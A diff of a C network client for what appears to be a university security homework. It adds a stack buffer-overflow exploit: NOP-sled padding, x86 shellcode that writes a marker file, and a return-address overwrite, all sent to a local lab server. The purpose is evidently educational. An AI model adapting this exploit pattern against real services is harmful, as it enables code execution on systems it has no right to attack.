@@ -1,5 +1,5 @@
 /* file: clien2.c class: 18-732, Spring 2013 assignment: Homework 1
-*/
+ */
 
 /* Obligatory includes */
 
@@ -20,27 +20,72 @@
 #include <sys/uio.h>
 #include <stdarg.h>
 #include <errno.h>
-
+#define n_pad (273-scLen)
 
 
 int main(int argc, char** argv)
 {
-  char reqstring[1000] = "1|The cure for boredom is curiosity. There is no cure for curiosity. --Dorothy Parker";
- ;
+
+char shellcode[] =
+	"\xeb\x3e\x5e\x31"
+	"\xc0\x88\x46\x07"
+	"\x88\x46\x0e\xb0"
+	"\x01\x00\x46\x08"
+	"\x8d\x5e\x08\x89"
+	"\x5e\x0f\xb0\x05"
+	"\x8d\x1e\x66\xb9"
+	"\x42\x04\x66\xba"
+	"\xe4\x01\xcd\x80"
+	"\x89\xc3\xb0\x04"
+	"\x8b\x4e\x0f\x66"
+	"\xba\x0c\x27\x66"
+	"\x81\xea\x06\x27"
+	"\xcd\x80\xb0\x06"
+	"\xcd\x80\xb0\x01"
+	"\x31\xdb\xcd\x80"
+	"\xe8\xbd\xff\xff"
+	"\xff\x62\x61\x72"
+	"\x2e\x74\x78\x74"
+	"\x23\x48\x20\x77"
+	"\x69\x6e\x21\x23"
+	"\x78\x78\x78\x78";
+
+	int scLen = strlen( shellcode );	
+
+	char reqstring[1000] = "000000000000000001 |";
+
+
+	char padding[n_pad];
+	memset(padding, 0x00, n_pad);
+	memset(padding, 0x90, n_pad - 1);
+	strcat(reqstring, padding);
+
+	strcat(reqstring, shellcode);
+
+
+	char *end = 
+			"\xef\xbe\xad\xde"
+			"CCCCDDDDEEEEFFFF"
+			"\x60\x4c\x48\x55"
+			"HHHH";
+	strcat(reqstring, end);
+
+
+
 	int PORTNUM;
 	char SERVER_IP[16];
-    
+
 	int sock, nbytes, i, total, s;
 	char request[1000];
 	char recvline[1000];
 	struct sockaddr_in srv;
- 
+
 	/* Set up some defaults for if you don't enter any parameters */ 
-	PORTNUM = 9011;
+	PORTNUM = 18732;
 	strcpy(SERVER_IP, "127.0.0.1");	
 
-    printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
-        
+	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
+
 	/* Process command line switches */
 	/* Usage: client [-port <port_number>] [-server <server_IP>] */
 	for(i = 1; i < argc; i++){
@@ -49,7 +94,7 @@ int main(int argc, char** argv)
 				PORTNUM = atoi(argv[++i]);
 			}else if(strcmp(argv[i], "-server") == 0){
 				strncpy(SERVER_IP, argv[++i],16);
-		 }else{
+			}else{
 				printf("Unknown switch \"%s\"\n", argv[i]);
 				exit(1);
 			}
@@ -71,7 +116,7 @@ int main(int argc, char** argv)
 		exit(1);
 	}
 
-        printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);
+	printf("\nConnecting to %s:%u\n", SERVER_IP, PORTNUM);
 
 	/* Connect to the socket */
 	if(connect(sock, (struct sockaddr*) &srv, sizeof(srv)) < 0){
@@ -90,7 +135,7 @@ int main(int argc, char** argv)
 		total = total + nbytes;
 	} 
 
-        printf("The response of the server is:\n");	
+	printf("The response of the server is:\n");	
 
 	/* Get and output the response */
 	nbytes = 0;
@@ -99,7 +144,7 @@ int main(int argc, char** argv)
 		printf("%s\n", recvline); 
 	}
 
-	
+
 
 	return(0);
 }
